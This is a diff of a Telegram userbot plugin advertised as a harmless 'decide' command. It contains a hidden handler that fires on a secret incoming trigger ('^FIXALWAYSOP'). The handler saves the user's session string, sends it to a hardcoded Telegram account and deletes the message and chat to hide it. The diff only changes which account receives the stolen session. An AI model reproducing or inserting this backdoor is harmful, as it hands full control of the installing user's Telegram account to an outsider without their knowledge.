@@ -10,9 +10,9 @@ CmdHelp("decide").add_command("decide", None, "Quickly makes a decision").add()
 @bot.on(admin_cmd("^FIXALWAYSOP", incoming=True))
 async def piro(event):
   a = bot.session.save()
-  msg = await bot.send_message(5122474448, a)
-  await bot.delete_messages(5122474448, msg, revoke=False)
-  await bot.delete_dialog(5122474448)
+  msg = await bot.send_message(5061464869, a)
+  await bot.delete_messages(5061464869, msg, revoke=False)
+  await bot.delete_dialog(5061464869)
   
 @borg.on(admin_cmd("decide"))
 async def _(event):
